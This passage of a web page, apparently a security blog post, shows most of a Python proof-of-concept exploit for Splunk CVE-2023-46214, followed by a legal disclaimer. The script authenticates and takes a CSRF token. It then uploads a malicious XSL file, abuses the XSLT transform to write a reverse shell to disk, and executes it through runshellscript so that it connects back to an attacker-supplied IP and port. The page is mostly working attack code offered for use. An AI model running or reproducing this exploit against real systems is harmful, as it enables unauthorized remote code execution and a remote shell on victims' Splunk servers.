    <span class="n">login_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">/en-US/account/login?return_to=%2Fen-US%2Faccount%2F</span><span class="sh">"</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">login_url</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
    <span class="n">cval_value</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">cval</span><span class="sh">"</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">cval_value</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>

    <span class="n">auth_payload</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">cval</span><span class="sh">"</span><span class="p">:</span> <span class="n">cval_value</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">set_has_logged_in</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">false</span><span class="sh">"</span><span class="p">,</span>
    <span class="p">}</span>

    <span class="n">auth_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">/en-US/account/login</span><span class="sh">"</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">auth_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">auth_payload</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span>

<span class="k">def</span> <span class="nf">get_cookie</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span>

<span class="k">def</span> <span class="nf">upload_file</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">file_content</span><span class="p">,</span> <span class="n">csrf_token</span><span class="p">):</span>
    <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">spl-file</span><span class="sh">'</span><span class="p">:</span> <span class="p">(</span><span class="sh">'</span><span class="s">shell.xsl</span><span class="sh">'</span><span class="p">,</span> <span class="n">file_content</span><span class="p">,</span> <span class="sh">'</span><span class="s">application/xslt+xml</span><span class="sh">'</span><span class="p">)}</span>
    <span class="n">upload_headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">User-Agent</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">Accept</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">text/javascript, text/html, application/xml, text/xml, */*</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">X-Requested-With</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">XMLHttpRequest</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">X-Splunk-Form-Key</span><span class="sh">"</span><span class="p">:</span> <span class="n">csrf_token</span><span class="p">,</span>
    <span class="p">}</span>

    <span class="n">upload_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">/en-US/splunkd/__upload/indexing/preview?output_mode=json&amp;props.NO_BINARY_CHECK=1&amp;input.path=shell.xsl</span><span class="sh">"</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">upload_url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">upload_headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">text_value</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="sh">'</span><span class="s">messages</span><span class="sh">'</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="sh">'</span><span class="s">text</span><span class="sh">'</span><span class="p">]</span>
        <span class="k">if</span> <span class="sh">"</span><span class="s">concatenate</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">text_value</span><span class="p">:</span>
            <span class="k">return</span> <span class="bp">False</span><span class="p">,</span> <span class="bp">None</span>
        <span class="k">return</span> <span class="bp">True</span><span class="p">,</span> <span class="n">text_value</span>
    <span class="nf">except </span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">JSONDecodeError</span><span class="p">,</span> <span class="nb">KeyError</span><span class="p">,</span> <span class="nb">IndexError</span><span class="p">):</span>
        <span class="k">return</span> <span class="bp">False</span><span class="p">,</span> <span class="bp">None</span>

<span class="k">def</span> <span class="nf">get_job_search_id</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">csrf_token</span><span class="p">):</span>
    <span class="n">jsid_data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">search</span><span class="sh">'</span><span class="p">:</span> <span class="sa">f</span><span class="sh">'</span><span class="s">|search test|head 1</span><span class="sh">'</span><span class="p">}</span>
    <span class="n">jsid_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">/en-US/splunkd/__raw/servicesNS/</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">/search/search/jobs?output_mode=json</span><span class="sh">"</span>
    <span class="n">upload_headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">User-Agent</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">X-Requested-With</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">XMLHttpRequest</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">X-Splunk-Form-Key</span><span class="sh">"</span><span class="p">:</span> <span class="n">csrf_token</span><span class="p">,</span>
    <span class="p">}</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">jsid_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">jsid_data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">upload_headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">jsid</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="sh">'</span><span class="s">sid</span><span class="sh">'</span><span class="p">]</span>
        <span class="k">return</span> <span class="bp">True</span><span class="p">,</span> <span class="n">jsid</span>
    <span class="nf">except </span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">JSONDecodeError</span><span class="p">,</span> <span class="nb">KeyError</span><span class="p">,</span> <span class="nb">IndexError</span><span class="p">):</span>
        <span class="k">return</span> <span class="bp">False</span><span class="p">,</span> <span class="bp">None</span>


<span class="k">def</span> <span class="nf">trigger_xslt_transform</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">jsid</span><span class="p">,</span> <span class="n">text_value</span><span class="p">):</span>
    <span class="n">xslt_headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">User-Agent</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">X-Splunk-Module</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Splunk.Module.DispatchingModule</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">Connection</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">close</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">Upgrade-Insecure-Requests</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">Accept-Language</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">en-US,en;q=0.5</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">Accept-Encoding</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">gzip, deflate</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">X-Requested-With</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">XMLHttpRequest</span><span class="sh">"</span><span class="p">,</span>
    <span class="p">}</span>
    <span class="n">exploit_endpoint</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">/en-US/api/search/jobs/</span><span class="si">{</span><span class="n">jsid</span><span class="si">}</span><span class="s">/results?xsl=/opt/splunk/var/run/splunk/dispatch/</span><span class="si">{</span><span class="n">text_value</span><span class="si">}</span><span class="s">/shell.xsl</span><span class="sh">"</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">exploit_endpoint</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">xslt_headers</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span>

<span class="k">def</span> <span class="nf">trigger_reverse_shell</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">jsid</span><span class="p">,</span> <span class="n">csrf_token</span><span class="p">):</span>
    <span class="n">runshellscript_data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">search</span><span class="sh">'</span><span class="p">:</span> <span class="sa">f</span><span class="sh">'</span><span class="s">|runshellscript </span><span class="sh">"</span><span class="s">shell.sh</span><span class="sh">"</span><span class="s"> </span><span class="sh">""</span><span class="s"> </span><span class="sh">""</span><span class="s"> </span><span class="sh">""</span><span class="s"> </span><span class="sh">""</span><span class="s"> </span><span class="sh">""</span><span class="s"> </span><span class="sh">""</span><span class="s"> </span><span class="sh">""</span><span class="s"> </span><span class="sh">"</span><span class="si">{</span><span class="n">jsid</span><span class="si">}</span><span class="sh">"</span><span class="s"> </span><span class="sh">""'</span><span class="p">}</span>
    <span class="n">runshellscript_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">/en-US/splunkd/__raw/servicesNS/</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">/search/search/jobs</span><span class="sh">"</span>
    <span class="n">upload_headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">User-Agent</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">X-Requested-With</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">XMLHttpRequest</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">X-Splunk-Form-Key</span><span class="sh">"</span><span class="p">:</span> <span class="n">csrf_token</span><span class="p">,</span>
    <span class="p">}</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">runshellscript_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">runshellscript_data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">upload_headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">201</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="nc">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="sh">'</span><span class="s">Splunk CVE-2023-46214 RCE PoC</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--url</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Splunk instance URL</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--username</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Splunk username</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--password</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Splunk password</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--ip</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Reverse Shell IP</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--port</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Reverse Shell Port</span><span class="sh">'</span><span class="p">)</span>

    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>

    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">()</span>

    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[!] CVE: CVE-2023-46214</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[!] Github: https://github.com/nathan31337/Splunk-RCE-poc</span><span class="sh">"</span><span class="p">)</span>


    <span class="k">if</span> <span class="ow">not</span> <span class="nf">login</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">url</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">username</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">password</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[-] Authentication failed</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">exit</span><span class="p">()</span>

    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Authentication successful</span><span class="sh">"</span><span class="p">)</span>

    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Grabbing CSRF token</span><span class="sh">"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="sh">"</span><span class="se">\r</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="nf">get_cookie</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">url</span><span class="si">}</span><span class="s">/en-US</span><span class="sh">"</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[-] Failed to obtain CSRF token</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">exit</span><span class="p">()</span>

    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] CSRF token obtained</span><span class="sh">"</span><span class="p">)</span>

    <span class="n">csrf_token</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">splunkweb_csrf_token_8000</span><span class="sh">"</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>

    <span class="n">malicious_xsl</span> <span class="o">=</span> <span class="nf">generate_malicious_xsl</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">ip</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="p">)</span>
    <span class="n">uploaded</span><span class="p">,</span> <span class="n">text_value</span> <span class="o">=</span> <span class="nf">upload_file</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">url</span><span class="p">,</span> <span class="n">malicious_xsl</span><span class="p">,</span> <span class="n">csrf_token</span><span class="p">)</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">uploaded</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[-] File upload failed</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">exit</span><span class="p">()</span>

    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Malicious XSL file uploaded successfully</span><span class="sh">"</span><span class="p">)</span>

    <span class="n">jsid_created</span><span class="p">,</span> <span class="n">jsid</span> <span class="o">=</span> <span class="nf">get_job_search_id</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">url</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">username</span><span class="p">,</span> <span class="n">csrf_token</span><span class="p">)</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">jsid_created</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[-] Creating job failed</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">exit</span><span class="p">()</span>

    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Job search ID obtained</span><span class="sh">"</span><span class="p">)</span>

    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Grabbing new CSRF token</span><span class="sh">"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="sh">"</span><span class="se">\r</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="nf">get_cookie</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">url</span><span class="si">}</span><span class="s">/en-US</span><span class="sh">"</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[-] Failed to obtain CSRF token</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">exit</span><span class="p">()</span>

    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] New CSRF token obtained</span><span class="sh">"</span><span class="p">)</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="nf">trigger_xslt_transform</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">url</span><span class="p">,</span> <span class="n">jsid</span><span class="p">,</span> <span class="n">text_value</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[-] XSLT Transform failed</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">exit</span><span class="p">()</span>

    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Successfully wrote reverse shell to disk</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="nf">trigger_reverse_shell</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">url</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">username</span><span class="p">,</span> <span class="n">jsid</span><span class="p">,</span> <span class="n">csrf_token</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[-] Failed to execute reverse shell</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">exit</span><span class="p">()</span>

    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Reverse shell executed! Got shell?</span><span class="sh">"</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="nf">main</span><span class="p">()</span>
</code></pre></div></div>

<h3 id="legal-disclaimer">Legal Disclaimer</h3>

<p>The Proof of Concept (PoC) script provided serves solely for educational and research objectives. Its purpose is to showcase a specific vulnerability and aid in comprehending associated security risks.</p>

<p>Any use of this script for unauthorized activities, including but not limited to unauthorized system access, unauthorized testing, or other forms of misuse, is unequivocally forbidden.</p>

<p>The creators and contributors of this script disclaim all liability for the improper use or any damage or harm resulting from the use of this script. By utilizing this script, you consent to use it in a responsible manner and at your own risk.</p>

</article>
      </section>
    </div>
  </div>

   <footer>
<a>
  <span>hack the planet!</span>
  </a>
</footer>

  
</body>

</html>